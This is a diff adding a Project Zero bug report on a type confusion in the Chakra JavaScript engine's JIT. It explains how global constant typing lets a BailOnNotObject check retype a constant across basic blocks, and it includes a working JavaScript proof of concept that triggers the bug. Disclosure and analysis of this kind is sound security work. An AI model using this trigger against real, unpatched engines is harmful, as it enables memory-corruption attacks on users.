@@ -1,0 +1,119 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1364
+
+1.
+In the Chakra's JIT compilation process, it stores variables' type information by basic block.
+
+function opt(b) {
+    let o;
+    if (b) {
+        // BASIC BLOCK (a)
+        o = {};
+    } else {
+        // BASIC BLOCK (b)
+        o = 1.1;
+    }
+    // BASIC BLOCK (c)
+    return o;
+}
+
+For example, let's think the above code gets optimized. At the basic block (a), the type of "o" is always "Object". At the basic block (b), the type of "o" is always "CanBeTaggedValue_Float". At the basic block (c), it combines the two types, and marks the type of "o" as "CanBeTaggedValue_Mixed"(Object + CanBeTaggedValue_Float).
+
+Explanation of TaggedValue in Chakra: http://abchatra.github.io/TaggedFloat/
+
+But unlike variables, the type information of constants like numbers, strings is managed globally. This means, once a constant is marked as some type in a certain block. All blocks will treat it as that type regardless of the control flow.
+
+2.
+Chakra uses a BailOutOnTaggedValue bailout to ensure a variable's type is "Object". The bailouts can be generated when inlining JavaScript functions.
+
+function opt(inlinee) {
+    inlinee();
+}
+
+Generated IR code for the above code:
+                       StatementBoundary  #0                                  #0000 
+    s6.var          =  StartCall      1 (0x1).i32                             #0000 
+                       BailOnNotObject  s3[LikelyCanBeTaggedValue_Object].var #0006  Bailout: #0006 (BailOutOnInlineFunction)
+    s10.var         =  Ld_A           [s3[LikelyObject].var+8].u64            #0006 
+                       BailOnNotEqual  [s10.var!].i32, 26 (0x1A).i32          #      Bailout: #0006 (BailOutOnInlineFunction)
+                       BailOnNotEqual  [s3[LikelyObject].var+40].u64, 0xXXXXXXXX (FunctionBody [Anonymous function (#1.3), #4]).u64 # Bailout: #0006 (BailOutOnInlineFunction)
+
+As you can see after the "BailOnNotObject" opcode which generates "BailOutOnTaggedValue" bailouts, the type of "s3" becomes "LikelyObject" from "LikelyCanBeTaggedValue_Object". This means there's no case where "s3" is not an object after the opcode which ensures its type, so it's safe to use it as an object without checks after the opcode.
+
+But the problem is that this can be applied to constants.
+
+Here's the PoC.
+*/
+
+function opt2(inlinee, v) {
+    if (v > 0) {
+        inlinee();
+    } else {
+        inlinee.x = 1.1;
+    }
+}
+
+function opt() {
+    opt2(2.3023e-320, null);
+}
+
+function main() {
+    opt2(() => {}, 1);  // feed a function to the profiler
+
+    for (let i = 0; i < 10000; i++) {
+        opt();
+    }
+}
+
+main();
+
+/*
+We can simply think it as follows:
+(NOT PRECISE just for understanding)
+
+Just after inlining:
+    // Basic block (a)
+    s2 = 2.30235E-320;  // constant
+    inlinee = s2;  // variable
+    if (null > 0) {
+        // Basic block (b)
+        BailOnNotObject(inlinee);
+        inlinee();
+    } else {
+        // Basic block (c)
+        inlinee.x = 1.1;
+    }
+
+    Type map:
+        Constants:
+            s2: CanBeTaggedValue_Float
+        Basic block (a):
+            inlinee: CanBeTaggedValue_Float
+        Basic block (b):
+            inlinee: CanBeTaggedValue_Float
+        Basic block (c):
+            inlinee: CanBeTaggedValue_Float
+
+In the Global Optimization Phase:
+    // Basic block (a)
+    s2 = 2.30235E-320;
+    if (null > 0) {
+        // Basic block (b)
+        BailOnNotObject(s2);
+        s2();
+    } else {
+        // Basic block (c)
+        s2.x = 1.1;
+    }
+
+    Type map:
+        Constants:
+            s2: CanBeTaggedValue_Float -> Float
+        Basic block (a):
+        Basic block (b):
+        Basic block (c):
+
+At the basic block (b), the BailOnNotObject opcode changes the type of "s2" to "Float". And since "s2" is a constant, that change affects the basic block (c). So it leads to type confusion at the basic block (c).
+
+Note: Just "Float" is considered an Object type.
+*/
